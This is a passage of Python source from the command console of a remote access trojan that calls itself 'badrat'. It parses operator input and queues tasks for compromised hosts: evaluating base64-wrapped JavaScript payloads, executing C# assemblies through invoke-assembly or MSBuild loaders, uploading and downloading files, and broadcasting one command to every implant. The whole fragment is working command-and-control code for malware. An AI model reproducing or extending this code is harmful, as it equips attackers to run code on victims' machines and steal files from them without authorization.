                        elif(str.startswith(inp, "runextra ")):
                            try:
                                filepath = inp.split(" ")[1]
                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
                                    pretty_print("[!] Runextra is not supported for PS1 or C# rats")
                                    continue
                                else:
                                    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
                                        run_extra_data = fd.read()
                                    inp = "ev " + base64.b64encode(run_extra_data.replace("~~EXTRAB64~~", encode_file(filepath)).encode('utf-8')).decode('utf-8')
                            except Exception as e:
                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                pretty_print(str(e))
                                continue

                        elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                            try:
                                filepath = inp.split(" ")[1]
                                if(types[ratID] == "ps1"):
                                    inp = "cs " + send_invoke_assembly(inp)
                                elif(types[ratID] == "c#"):
                                    inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
                                else:
                                    inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                            except:
                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                continue

                        elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
                            try:
                                localpath = inp.split(" ")[1]
                                remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
                                # remotepath = remotepath.replace("\\", "\\\\") # Might not actually need to replace with double backslashes. Removed to allow \\UNC\paths
                                inp = "up " + encode_file(localpath) + " " + remotepath
                            except:
                                pretty_print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
                                continue

                        # Alias download=dl
                        elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
                            inp = " ".join(inp.split(" ")[1:])
                            inp = "dl " + inp

                        pretty_print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                        if(ratID == "all"):
                        # update ALL commands
                            for i in commands.keys():
                                commands[i] = inp
                        else:
                            commands[ratID] = inp
        except KeyboardInterrupt:
            pretty_print("[!] Caught Ctrl+C. Type 'exit' to quit badrat")
